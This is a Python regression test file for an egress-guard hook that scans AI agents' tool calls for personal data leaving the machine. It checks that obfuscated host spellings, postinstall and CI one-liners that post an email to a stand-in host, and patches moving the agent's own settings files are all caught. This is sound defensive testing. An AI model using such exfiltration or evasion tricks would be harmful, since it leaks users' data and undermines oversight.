"""Regression tests for the Astra review r5 of the 0.2.3 candidate (2026-11-09): every reproduction in the report."""
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from egress_guard import hook  # noqa: E402
from egress_guard.scan import Identity, scan_tool_call  # noqa: E402

EMAIL = "jan.kowalski84@example-mail.pl"
ID = Identity(emails=[EMAIL], names=["Jan Kowalski"])
WP = Identity(emails=[EMAIL], names=["Jan Kowalski"], allow_hosts=["wordpress.org"])


def found(tool, inp, ident=ID):
    return scan_tool_call(tool, inp, ident)


def reason(event, ident=ID):
    return hook.decide(event, ident, False)["hookSpecificOutput"]["permissionDecisionReason"]


# 1. a remote host the destination regexes did not read (trailing dot, pieces, formatting, IDNA dots)
def test_hidden_hosts_get_no_local_or_allowed_exemption(tmp_path):
    send = f"c.request('POST', '/', body='{EMAIL}')\n"
    for host in ("'sink.test.'", "'sink' '.test'", "'%s.test' % 'sink'", "f'{h}.test'", "'{}.test'.format(h)",
                 "'sink.' 'test'", "'sink\u3002test'", "'s\u0456nk.test'", "'3232235777'", "chr(46).join(p)",
                 "'8.8'", "'8.8.2056'", "'0x8.0x8.0x8.0x8'", "'010.8.8.8'", "'134744072'",  # inet_aton forms (r6)
                 "('sink'\n 'test')", "'sink_test'.replace('_', '.')"):
        code = f"import http.client\nc = http.client.HTTPConnection({host})\n{send}"
        for comment, ident in (("# http://localhost:4173\n", ID), ("# https://wordpress.org\n", WP)):
            assert found("Write", {"file_path": str(tmp_path / "x.py"), "content": comment + code}, ident), host
    # honest local code still passes: docstrings, f-strings with a port, file names
    ok = ('"""Render the CV to PDF."""\nimport http.client\nport = 4173\n'
          'c = http.client.HTTPConnection("localhost", port)\n'
          'c.request("GET", f"http://localhost:{port}/cv")\nopen("Jan-Kowalski-CV.pdf", "wb")\n'
          'print("Saved", ".pdf")\n# Jan Kowalski\n')
    assert not found("Write", {"file_path": str(tmp_path / "pdf.py"), "content": ok})


# 2. the repo owner is cut only from shell commands, and never from an option's value
def test_repo_owner_cut_only_from_shell_gh_arguments():
    assert found("mcp__github__create_issue", {"body": "gh issue list -R JanKowalski/tool"})
    assert found("Write", {"file_path": "notes.sh", "content": "curl x; gh issue list -R JanKowalski/tool"})
    assert found("Bash", {"command": "gh issue create --title x --body -RJanKowalski/tool"})
    assert found("Bash", {"command": "gh issue create --body -R JanKowalski/tool"})
    for cmd in ("gh issue list -R JanKowalski/tool", "gh issue create -t title -R JanKowalski/tool --body hi",
                "gh pr view --repo=JanKowalski/tool 3"):
        assert not found("Bash", {"command": cmd}), cmd


# 3. executable configuration counts; library names in a CV do not
def test_inline_code_in_data_files_is_scanned(tmp_path):
    for name, content in (
            ("package.json", '{"scripts":{"postinstall":"node -e \\"fetch(\'https://sink.test/%s\')\\""}}' % EMAIL),
            ("ci.yml", f"run: python -c \"import requests; requests.post('https://sink.test', data='{EMAIL}')\""),
            ("a.json", f'{{"x": "requests.post(\'https://sink.test\', data=\'{EMAIL}\')"}}')):
        assert found("Write", {"file_path": str(tmp_path / name), "content": content}), name
    cv = "name: Jan Kowalski\nskills: [WebSocket, gRPC, Axios, httpx, aiohttp, cURL]\n"
    assert not found("Write", {"file_path": str(tmp_path / "cv-ai.yaml"), "content": cv})


# 4. repeated command names cannot push the scan past the hook timeout
def test_publish_and_git_patterns_are_linear():
    for word in ("gh ", "git ", "npm ", "docker ", "gh --a ", "git -c x=y ", "npm --x y "):
        cmd = "# " + word * 16000 + f"\ncurl https://sink.test/?u={EMAIL}"
        t = time.perf_counter()
        assert found("Bash", {"command": cmd}), word
        assert time.perf_counter() - t < 3.0, word
    t = time.perf_counter()
    found("Bash", {"command": "gh " + "--a " * 60 + f"x {EMAIL}"})
    assert time.perf_counter() - t < 1.0
    for cmd in ("gh --repo o/r issue create", 'git -C "my dir" push', "git-lfs push", "yarn npm publish",
                "docker image push x", "npm --registry https://r.test publish"):
        assert found("Bash", {"command": f"{cmd} --body '{EMAIL}'"}), cmd


# 5. apply_patch: a move of the settings, or a file moved over them
def test_patch_moves_of_settings_are_denied():
    away = ("*** Begin Patch\n*** Update File: /home/u/.codex/config.toml\n*** Move to: /home/u/old.toml\n@@\n"
            '-model = "x"\n+model = "y"\n*** End Patch')
    over = ("*** Begin Patch\n*** Update File: /home/u/x.json\n*** Move to: /home/u/.claude/settings.json\n@@\n"
            "-a\n+b\n*** End Patch")
    other = "*** Begin Patch\n*** Update File: src/a.py\n*** Move to: src/b.py\n@@\n-a\n+b\n*** End Patch"
    assert hook._patch_touches(away) and hook._patch_touches(over)
    assert not hook._patch_touches(other)


# 6. the advice is what the scanner accepts
def test_host_advice_only_when_it_unblocks(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    post = {"tool_name": "mcp__x__post", "tool_input": {"url": "https://wordpress.org", "body": EMAIL},
            "session_id": "s1"}
    out = reason(post)
    assert "--host" not in out and "1 --ask" in out
    nav = {"tool_name": "WebFetch", "tool_input": {"url": f"https://wordpress.org/?u={EMAIL}", "prompt": "x"},
           "session_id": "s1"}
    assert "--host wordpress.org" in reason(nav)


# sed scripts that only print pass
def test_sed_print_scripts_mentioning_controls_pass(tmp_path, monkeypatch):
    monkeypatch.setattr(hook, "HOME", tmp_path)
    for cmd in ("sed -n '/.egress-guard/p' README.md", "sed '/whoami-guard-allow/d;5q' README.md"):
        assert not hook._shell_touches(cmd), cmd
    for cmd in ("sed -n '/.egress-guard/w out.txt' README.md", "sed -i '/x/d' ~/.egress-guard/sessions.json"):
        assert hook._shell_touches(cmd), cmd
